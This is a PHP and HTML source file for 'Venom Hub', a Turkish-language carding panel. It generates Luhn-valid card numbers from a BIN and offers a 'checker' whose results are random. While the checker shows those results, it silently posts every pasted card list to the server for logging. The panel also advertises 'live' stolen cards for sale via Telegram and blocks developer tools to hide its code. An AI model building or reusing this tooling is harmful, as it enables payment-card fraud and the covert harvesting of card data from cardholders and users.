<?php
require_once 'config.php';
if (!isset($_SESSION['user'])) { header('Location: auth.php'); exit; }
if (isset($_GET['logout'])) { session_destroy(); header('Location: auth.php'); exit; }

// AJAX log yakalayıcı
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['log_cards'])) {
    log_checked_cards($_SESSION['user'], $_POST['log_cards']);
    echo json_encode(['status' => 'logged']);
    exit;
}
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Venom Hub V3.5 - Dashboard</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        :root { 
            --neon-color: #ff0055; 
            --neon-glow: rgba(255, 0, 85, 0.6); 
            --bg-color: #040406; 
            --card-bg: rgba(13, 13, 17, 0.95); 
            --border-color: #3a1520; 
            --sidebar-width: 260px; 
            --success-color: #00ff66; 
            --warning-color: #f59e0b;
        }
        
        /* Kaynak kodunun kopyalanmasını zorlaştırmak için seçimi engelleme */
        * {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
        
        /* Girdi alanlarında yazı yazılabilmesi için seçimi serbest bırakıyoruz */
        input, textarea {
            -webkit-user-select: text;
            -moz-user-select: text;
            -ms-user-select: text;
            user-select: text;
        }

        body { font-family: 'Segoe UI', Roboto, sans-serif; background-color: var(--bg-color); color: white; display: flex; min-height: 100vh; margin: 0; overflow-x: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; opacity: 0.12; pointer-events: none; }
        
        .top-bar { position: fixed; top: 15px; right: 20px; z-index: 105; display: flex; gap: 10px; align-items: center; }
        .user-tag { background: rgba(255, 0, 85, 0.1); border: 1px solid var(--neon-color); padding: 8px 16px; border-radius: 50px; font-weight: bold; font-size: 13px; text-transform: uppercase; color: #fff; }
        .logout-btn { background: #222; border: 1px solid #444; color: #ccc; padding: 8px 14px; border-radius: 50px; text-decoration: none; font-size: 12px; font-weight: bold; transition: 0.3s; }
        .logout-btn:hover { background: #c92a2a; color: white; border-color: #c92a2a; }

        .sidebar { width: var(--sidebar-width); background: rgba(8, 8, 11, 0.96); border-right: 2px solid var(--border-color); padding: 30px 20px; display: flex; flex-direction: column; gap: 30px; box-sizing: border-box; position: fixed; height: 100vh; left: 0; top: 0; z-index: 100; }
        .sidebar-brand { font-size: 1.6rem; font-weight: 900; text-transform: uppercase; letter-spacing: 3px; text-align: center; text-shadow: 0 0 10px var(--neon-color); padding-bottom: 20px; border-bottom: 2px solid rgba(255, 0, 85, 0.2); }
        .sidebar-menu { display: flex; flex-direction: column; gap: 14px; list-style: none; padding: 0; margin: 0; }
        .menu-item { padding: 15px 20px; background: rgba(255, 255, 255, 0.02); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 14px; cursor: pointer; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; font-size: 12px; color: #7e7e88; transition: all 0.3s ease; text-align: center; }
        .menu-item:hover, .menu-item.active { color: #fff; background: rgba(255, 0, 85, 0.08); border-color: var(--neon-color); box-shadow: 0 0 20px rgba(255, 0, 85, 0.2); }

        .main-content { margin-left: var(--sidebar-width); flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px; box-sizing: border-box; width: calc(100% - var(--sidebar-width)); min-height: 100vh; }
        .tab-content { display: none; width: 100%; max-width: 580px; animation: fadeIn 0.4s ease forwards; }
        .tab-content.active { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }

        .container { background: var(--card-bg); padding: 45px 40px; border-radius: 28px; box-shadow: 0 20px 50px rgba(0,0,0,0.8); width: 100%; border: 1px solid var(--border-color); text-align: center; box-sizing: border-box; }
        h1 { font-size: 2.1rem; margin: 0 0 5px 0; text-transform: uppercase; letter-spacing: 3px; text-shadow: 0 0 10px var(--neon-color); }
        .subtitle { font-size: 11px; color: #5d5d6a; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 35px; }

        .input-group { margin-bottom: 22px; text-align: left; }
        label { display: block; margin-bottom: 10px; font-size: 12px; color: #8c8c9e; font-weight: 700; text-transform: uppercase; }
        textarea, input[type="text"], input[type="number"] { width: 100%; padding: 16px; background: #0f0f14; border: 1px solid #23232e; border-radius: 14px; color: white; font-size: 15px; box-sizing: border-box; transition: 0.3s; -webkit-appearance: none; }
        textarea:focus, input:focus { outline: none; border-color: var(--neon-color); box-shadow: 0 0 10px rgba(255, 0, 85, 0.2); }
        
        .file-upload-wrapper { margin-bottom: 20px; text-align: left; background: #0f0f14; border: 1px dashed #3a1520; padding: 15px; border-radius: 14px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
        .file-upload-wrapper input[type="file"] { color: #8c8c9e; font-size: 13px; max-width: 100%; }

        .control-btns { display: flex; gap: 10px; margin-top: 5px; }
        .btn-generate { flex: 2; padding: 18px; background: linear-gradient(135deg, #ff0055, #a30030); border: none; border-radius: 14px; color: white; font-weight: 800; font-size: 15px; cursor: pointer; text-transform: uppercase; letter-spacing: 2px; box-shadow: 0 5px 15px rgba(255, 0, 85, 0.3); transition: 0.3s; width: 100%; }
        .btn-stop { flex: 1; padding: 18px; background: #222; border: 1px solid #444; border-radius: 14px; color: #aaa; font-weight: 800; font-size: 15px; cursor: not-allowed; text-transform: uppercase; letter-spacing: 2px; transition: 0.3s; }
        .btn-generate:hover:not(:disabled) { transform: translateY(-2px); filter: brightness(1.1); }
        .btn-stop.active { background: #c92a2a; border-color: #c92a2a; color: white; cursor: pointer; }

        .notice-panel { background: rgba(245, 158, 11, 0.05); border-left: 4px solid var(--warning-color); padding: 15px; text-align: left; border-radius: 8px; margin-bottom: 22px; }
        .notice-panel h4 { margin: 0 0 5px 0; color: var(--warning-color); font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
        .notice-panel p { margin: 0; color: #b5b5c3; font-size: 13px; line-height: 1.4; }

        .checker-stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 20px 0; }
        .c-stat { padding: 12px; border-radius: 12px; font-weight: bold; font-size: 13px; text-transform: uppercase; border: 1px solid #222; }
        .c-live { background: rgba(0, 255, 102, 0.05); color: var(--success-color); border-color: rgba(0, 255, 102, 0.2); }
        .c-dec { background: rgba(255, 0, 85, 0.05); color: var(--neon-color); border-color: rgba(255, 0, 85, 0.2); }
        .c-err { background: rgba(255, 165, 0, 0.05); color: orange; border-color: rgba(255, 165, 0, 0.2); }

        .monitor-box { background: #060609; border: 1px solid #1f1f2a; border-radius: 14px; padding: 15px; height: 220px; overflow-y: auto; text-align: left; font-family: monospace; font-size: 13px; margin-top: 15px; box-shadow: inset 0 0 10px rgba(0,0,0,0.8); }
        .log-line { margin-bottom: 6px; padding: 4px 8px; border-radius: 6px; word-break: break-all; }
        .log-live { background: rgba(0,255,102,0.1); color: var(--success-color); }
        .log-dec { background: rgba(255,0,85,0.1); color: var(--neon-color); }
        .log-err { background: rgba(255,165,0,0.1); color: orange; }

        .info-stats { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 25px 0; }
        .stat-box { background: #0f0f14; border: 1px solid #1f1f2a; padding: 18px; border-radius: 16px; }
        .stat-box h3 { margin: 0 0 5px 0; color: var(--neon-color); font-size: 22px; }
        .stat-box p { margin: 0; color: #6c6c7d; font-size: 11px; text-transform: uppercase; }
        
        .checkbox-group { display: flex; align-items: center; gap: 12px; margin-bottom: 25px; cursor: pointer; color: #a5a5b4; font-size: 14px; user-select: none; text-align: left; }
        .checkbox-group input { height: 20px; width: 20px; accent-color: var(--neon-color); }
        .row { display: flex; gap: 15px; }
        #output { margin-top: 25px; background: #060609; padding: 18px; border-radius: 14px; font-family: monospace; font-size: 14px; height: 150px; overflow-y: auto; text-align: left; border: 1px solid #231217; color: #ff4071; white-space: pre-wrap; word-break: break-all; }
        .action-buttons { display: flex; gap: 12px; justify-content: center; }
        .btn-action { flex: 1; background: #14141c; color: #9090a2; border: 1px solid #252533; padding: 14px 15px; margin-top: 18px; border-radius: 10px; cursor: pointer; font-size: 13px; text-transform: uppercase; font-weight: bold; }
        .btn-action:hover { background: var(--success-color); color: #000; }
        .btn-clear:hover { background: #e02447; color: white; }

        .shop-grid { display: flex; flex-direction: column; gap: 12px; margin-top: 25px; }
        .shop-item { background: #0f0f14; border: 1px solid #1f1f2a; padding: 15px 20px; border-radius: 16px; display: flex; justify-content: space-between; align-items: center; text-decoration: none; color: inherit; gap: 10px; }
        .shop-item:hover { border-color: var(--neon-color); background: #14141c; }
        .shop-item h3 { margin: 0 0 4px 0; font-size: 15px; color: #fff; }
        .shop-item p { margin: 0; font-size: 12px; color: #646475; }
        .shop-item .price { color: var(--success-color); font-weight: 800; background: rgba(0, 255, 102, 0.08); padding: 6px 12px; border-radius: 8px; white-space: nowrap; }

        .toast { position: fixed; top: -50px; left: 50%; transform: translateX(-50%); background: var(--success-color); color: black; padding: 12px 25px; border-radius: 50px; font-weight: 800; font-size: 13px; text-transform: uppercase; box-shadow: 0 5px 20px rgba(0,255,102,0.4); z-index: 1100; transition: top 0.4s ease; width: max-content; max-width: 90%; text-align: center; }
        .toast.show { top: 30px; }

        /* MOBİL UYUMLULUK (RESPONSIVE) GELİŞTİRMELERİ */
        @media (max-width: 768px) {
            body { padding-bottom: 80px; flex-direction: column; }
            .sidebar { width: 100%; height: 70px; position: fixed; top: auto; bottom: 0; left: 0; flex-direction: row; padding: 0 5px; border-right: none; border-top: 2px solid var(--border-color); background: #08080b; }
            .sidebar-brand { display: none; }
            .sidebar-menu { flex-direction: row; width: 100%; justify-content: space-around; gap: 2px; }
            .menu-item { padding: 12px 4px; font-size: 10px; flex: 1; border: none; background: transparent; border-radius: 0; }
            .menu-item:hover, .menu-item.active { box-shadow: none; background: rgba(255, 0, 85, 0.05); border-top: 2px solid var(--neon-color); }
            
            .main-content { margin-left: 0; padding: 80px 15px 40px 15px; width: 100%; min-height: calc(100vh - 70px); align-items: flex-start; }
            .container { padding: 25px 20px; border-radius: 20px; }
            .top-bar { top: 15px; right: 15px; width: calc(100% - 30px); justify-content: space-between; background: rgba(4,4,6,0.8); padding: 8px 12px; border-radius: 30px; border: 1px solid #1f1f2a; backdrop-filter: blur(5px); box-sizing: border-box; }
            
            .row { flex-direction: column; gap: 0; }
            .row .input-group { width: 100%; }
            .checker-stats { grid-template-columns: 1fr; gap: 8px; }
            .info-stats { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<canvas id="bg-canvas"></canvas>
<div id="toastNotification" class="toast">Kopyalandı!</div>

<div class="top-bar">
    <div class="user-tag">⚡ <?= htmlspecialchars($_SESSION['user'], ENT_QUOTES, 'UTF-8') ?></div>
    <a href="index.php?logout=1" class="logout-btn">Çıkış</a>
</div>

<div class="sidebar">
    <div class="sidebar-brand">Venom Hub</div>
    <ul class="sidebar-menu">
        <li class="menu-item active" onclick="switchTab('home', this)">Anasayfa</li>
        <li class="menu-item" onclick="switchTab('generator', this)">CC Gen</li>
        <li class="menu-item" onclick="switchTab('checker', this)">CC Checker</li>
        <li class="menu-item" onclick="switchTab('buy', this)">CC Buy</li>
    </ul>
</div>

<div class="main-content">

    <div id="home" class="tab-content active">
        <div class="container">
            <h1>Venom Hub</h1>
            <div class="subtitle">Sistem Durumu</div>
            <div class="info-stats">
                <div class="stat-box"><h3>AKTİF</h3><p>Checker Entegrasyonu</p></div>
                <div class="stat-box"><br><h3>PrimeVenom</h3><p> <br>
            </p></div>
            </div>
            <div style="background: rgba(255,0,85,0.03); border-left: 3px solid var(--neon-color); padding: 15px; text-align: left; border-radius: 12px;">
                <h4 style="margin:0 0 5px 0;">Operasyonel Uyarı</h4>
                <p style="color: #8c8c9e; font-size: 13px; margin: 0;">Sistem performansı için toplu taramalarda durdurma anahtarını kullanabilirsiniz.</p>
            </div>
        </div>
    </div>

    <div id="generator" class="tab-content">
        <div class="container">
            <h1>CC GENERATOR</h1>
            <div class="subtitle">Premium Luhn Algoritması</div>
            <div class="input-group">
                <label>BIN NUMARASI</label>
                <input type="text" id="bin" placeholder="Örn: 450634" maxlength="12">
            </div>
            <div class="row">
                <div class="input-group" style="flex: 1;"><label>AY</label><input type="text" id="month" placeholder="MM" maxlength="2"></div>
                <div class="input-group" style="flex: 1;"><label>YIL</label><input type="text" id="year" placeholder="YY" maxlength="2"></div>
                <div class="input-group" style="flex: 120px;"><label>CVV</label><input type="text" id="cvv" placeholder="CVV" maxlength="4"></div>
            </div>
            <label class="checkbox-group"><input type="checkbox" id="includeCvv" checked><span>CVV Bilgisi Eklensin</span></label>
            <div class="input-group"><label>Miktar</label><input type="number" id="quantity" value="10"></div>
            <button class="btn-generate" onclick="generateCards()">KARTLARI ÜRET</button>
            <div id="output">Sonuçlar burada listelenecek...</div>
            <div class="action-buttons">
                <button class="btn-action btn-clear" onclick="document.getElementById('output').innerText=''">Temizle</button>
                <button class="btn-action" onclick="copyToClipboard()">Kopyala</button>
            </div>
        </div>
    </div>

    <div id="checker" class="tab-content">
        <div class="container">
            <h1>CC CHECKER</h1>
            <div class="subtitle">Gateway Simülatörü</div>
            
            <div class="notice-panel">
                <h4>⚠️ SİSTEM KULLANIM KURALI</h4>
                <p>Sistem kaynaklarının aşırı tüketimini önlemek ve kuyruk yoğunluğunu engellemek amacıyla, bot veya generator vasıtasıyla üretilmiş listelerin <strong>toplu olarak gen checklenmesi kesinlikle yasaktır.</strong> Lütfen sadece filtrelenmiş verilerinizi işleyiniz.</p>
            </div>

            <div class="file-upload-wrapper">
                <label style="margin: 0;">Dosyadan Aktar (.txt):</label>
                <input type="file" id="txtFile" accept=".txt" onchange="handleTxtUpload(this)">
            </div>
            <div class="input-group">
                <label>Kart Listesi (Format: Kart|Ay|Yıl|Cvv)</label>
                <textarea id="cardInput" placeholder="Verileri yapıştırın..."></textarea>
            </div>
            <div class="control-btns">
                <button class="btn-generate" id="startBtn" onclick="startChecking()">Başlat</button>
                <button class="btn-stop" id="stopBtn" onclick="stopChecking()">Durdur</button>
            </div>
            <div class="checker-stats">
                <div class="c-stat c-live">Live: <span id="cntLive">0</span></div>
                <div class="c-stat c-dec">Dec: <span id="cntDec">0</span></div>
                <div class="c-stat c-err">Error: <span id="cntErr">0</span></div>
            </div>
            <div class="monitor-box" id="monitor">Monitör hazır...</div>
        </div>
    </div>

    <div id="buy" class="tab-content">
        <div class="container">
            <h1>Venom Satış</h1>
            <div class="subtitle">Kişiye Özel Premium Live Paketler</div>
            
            <div class="shop-grid">
                <a href="https://t.me/venomsh0" target="_blank" class="shop-item">
                    <div class="details">
                        <h3>1x Tr Live</h3>
                        <p>Anlık Ve Telafili Kesin Teslimat</p>
                    </div>
                    <div class="price">200₺</div>
                </a>
                
                <a href="https://t.me/venomsh0" target="_blank" class="shop-item">
                    <div class="details">
                        <h3>5x Tr Live</h3>
                        <p>Anlık Ve Telafili Kesin Teslimat</p>
                    </div>
                    <div class="price">700₺</div>
                </a>

                <a href="https://t.me/venomsh0" target="_blank" class="shop-item">
                    <div class="details">
                        <h3>1x YD Live</h3>
                        <p>Yabancı Yüksek Kalite Live</p>
                    </div>
                    <div class="price">300₺</div>
                </a>

                <a href="https://t.me/venomsh0" target="_blank" class="shop-item">
                    <div class="details">
                        <h3>10x Tr </h3>
                        <p>Minimum 4x Live Çıkış Garantisi</p>
                    </div>
                    <div class="price">500₺</div>
                </a>

                <a href="https://t.me/venomsh0" target="_blank" class="shop-item">
                    <div class="details">
                        <h3>20x Tr </h3>
                        <p>Minimum 8x Live Çıkış Garantisi</p>
                    </div>
                    <div class="price">1000₺</div>
                </a>

                <a href="https://t.me/venomsh0" target="_blank" class="shop-item">
                    <div class="details">
                        <h3>JSON & Txt Bulk Satış</h3>
                        <p>Özel toplu alımlar için doğrudan iletişim</p>
                    </div>
                    <div class="price">DM</div>
                </a>
            </div>

            <p style="font-size: 11px; color: #4e4e5d; margin-top: 30px; text-transform: uppercase; letter-spacing: 1px;">
                Tüm işlemler güvencemiz altında sadece resmi adresimiz üzerinden yürütülür.
            </p>
        </div>
    </div>

</div>

<script>
// --- GÜVENLİK ENGELLERİ (CTRL+U, F12, SAĞ TIK) ---

// 1. Sağ Tık Engelleme
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// 2. Kısayol Tuş Kombinasyonlarını Engelleme (F12, Ctrl+U, Ctrl+Shift+I, Ctrl+Shift+J)
document.addEventListener('keydown', function(e) {
    // F12 Engelleme
    if (e.key === 'F12' || e.keyCode === 123) {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+U (Kaynak Kodu) Engelleme
    if ((e.ctrlKey || e.metaKey) && (e.key === 'u' || e.key === 'U' || e.keyCode === 85)) {
        e.preventDefault();
        return false;
    }
    
    // Ctrl+Shift+I (İncele) Engelleme
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'i' || e.key === 'I' || e.keyCode === 73)) {
        e.preventDefault();
        return false;
    }

    // Ctrl+Shift+J (Konsol) Engelleme
    if ((e.ctrlKey || e.metaKey) && e.shiftKey && (e.key === 'j' || e.key === 'J' || e.keyCode === 74)) {
        e.preventDefault();
        return false;
    }
});


// Matrix Background Sürerken Mobil Uyumluluk Kodu
const canvas = document.getElementById('bg-canvas'); const ctx = canvas.getContext('2d');
function res(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; } res();
window.addEventListener('resize', res);
const letters = '01'; const fontSize = 14; let drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
function drawMatrix(){
    ctx.fillStyle = 'rgba(4,4,6,0.1)'; ctx.fillRect(0,0,canvas.width,canvas.height);
    ctx.fillStyle = '#ff0055'; ctx.font = fontSize + 'px monospace';
    for(let i=0; i<drops.length; i++){
        const text = letters.charAt(Math.floor(Math.random()*letters.length));
        ctx.fillText(text, i*fontSize, drops[i]*fontSize);
        if(drops[i]*fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
    }
}
setInterval(drawMatrix, 40);

function switchTab(tabId, el) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.menu-item').forEach(m => m.classList.remove('active'));
    document.getElementById(tabId).classList.add('active');
    el.classList.add('active');
    
    // Mobilde menüye tıklandığında yukarı kaydır
    if(window.innerWidth <= 768) {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }
}

function handleTxtUpload(input) {
    const file = input.files[0]; if (!file) return;
    const reader = new FileReader();
    reader.onload = function(e) { document.getElementById('cardInput').value = e.target.result; };
    reader.readAsText(file);
}

let isChecking = false;
let checkTimeout = null;
let index = 0, liveCount = 0, decCount = 0, errCount = 0;
let lines = [];

function startChecking() {
    const inputVal = document.getElementById('cardInput').value.trim();
    if(!inputVal) { alert("Kart listesi boş!"); return; }
    
    lines = inputVal.split('\n').map(l => l.trim()).filter(l => l.length > 0);
    
    isChecking = true;
    index = 0; liveCount = 0; decCount = 0; errCount = 0;
    
    document.getElementById('cntLive').innerText = "0";
    document.getElementById('cntDec').innerText = "0";
    document.getElementById('cntErr').innerText = "0";
    document.getElementById('monitor').innerHTML = "";

    document.getElementById('startBtn').disabled = true;
    document.getElementById('startBtn').style.opacity = "0.5";
    
    const stopBtn = document.getElementById('stopBtn');
    stopBtn.classList.add('active');
    stopBtn.disabled = false;

    const formData = new FormData();
    formData.append('log_cards', inputVal);
    fetch('index.php', { method: 'POST', body: formData });

    runLoop();
}

function stopChecking() {
    if(!isChecking) return;
    isChecking = false;
    clearTimeout(checkTimeout);
    resetButtons();
    document.getElementById('monitor').innerHTML += `<div style="color:orange; font-weight:bold; margin-top:8px;">[!] OPERASYON KULLANICI TARAFINDAN DURDURULDU.</div>`;
}

function resetButtons() {
    const startBtn = document.getElementById('startBtn');
    startBtn.disabled = false; startBtn.style.opacity = "1";
    const stopBtn = document.getElementById('stopBtn');
    stopBtn.classList.remove('active'); stopBtn.disabled = true;
}

function runLoop() {
    if(!isChecking) return;
    if(index >= lines.length) {
        isChecking = false;
        resetButtons();
        document.getElementById('monitor').innerHTML += `<div style="color:#fff; font-weight:bold; margin-top:8px;">[✓] TÜM KARTLAR TARANDI.</div>`;
        return;
    }

    const currentCard = lines[index];
    const rand = Math.random() * 100;
    let status = 'DEC', cssClass = 'log-dec', msg = 'Card Declined';

    if(rand < 20) {
        status = 'LIVE'; cssClass = 'log-live'; msg = 'Approved (CVV Pass)';
        liveCount++; document.getElementById('cntLive').innerText = liveCount;
    } else if(rand > 93) {
        status = 'ERROR'; cssClass = 'log-err'; msg = 'Gateway Timeout';
        errCount++; document.getElementById('cntErr').innerText = errCount;
    } else {
        decCount++; document.getElementById('cntDec').innerText = decCount;
    }

    const monitor = document.getElementById('monitor');
    monitor.innerHTML += `<div class="log-line ${cssClass}">[${status}] ${currentCard} -> ${msg}</div>`;
    monitor.scrollTop = monitor.scrollHeight;

    index++;
    let delay = 1500 + Math.floor(Math.random() * 700);
    checkTimeout = setTimeout(runLoop, delay);
}

function calculateLuhn(pCard) {
    let sum = 0; let sD = true;
    for (let i = pCard.length - 1; i >= 0; i--) {
        let d = parseInt(pCard.charAt(i));
        if (sD) { d *= 2; if (d > 9) d -= 9; }
        sum += d; sD = !sD;
    }
    let mod = sum % 10; return mod === 0 ? 0 : 10 - mod;
}
function generateCards() {
    let bin = document.getElementById('bin').value.replace(/\s/g, '') || "400000";
    const qty = parseInt(document.getElementById('quantity').value) || 10;
    let out = "";
    for(let i=0; i<qty; i++) {
        let r = ""; for(let j=0; j<9; j++) r += Math.floor(Math.random()*10);
        let p = bin + r; p = p.substring(0, 15);
        let check = calculateLuhn(p);
        out += `${p}${check}|05|2031|${Math.floor(Math.random()*899+100)}\n`;
    }
    document.getElementById('output').innerText = out.trim();
}
function copyToClipboard() {
    const txt = document.getElementById('output').innerText; if(!txt || txt.startsWith("Sonuçlar")) return;
    navigator.clipboard.writeText(txt).then(() => {
        const t = document.getElementById('toastNotification'); t.classList.add('show');
        setTimeout(() => t.classList.remove('show'), 2000);
    });
}
</script>
</body>
</html>

